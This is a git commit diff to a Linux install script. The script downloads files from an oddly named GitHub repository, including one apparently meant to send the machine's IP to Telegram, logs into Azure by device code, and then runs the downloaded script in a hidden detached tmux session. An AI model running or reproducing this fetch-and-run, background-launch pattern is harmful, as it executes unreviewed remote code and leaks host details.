b7ae332b940fd768c315554f5cc0d92a2c66d9a9
samuraifinseev <155964563+samuraifinseev@users.noreply.github.com>
2024-07-06 04:28:22 +0500

    Update install_pack_linux.sh

--- install_pack_linux.sh
+++ install_pack_linux.sh
@@ -6,4 +6,5 @@ wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/r
 chmod +x script_linux.sh
 wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/linux_send_ip_to_tg.py
 pip3 install serviceping -y
-az login --use-device-code
+az login --use-device-code && sleep 600
+tmux new -ds scr_cli ./script_linux.sh
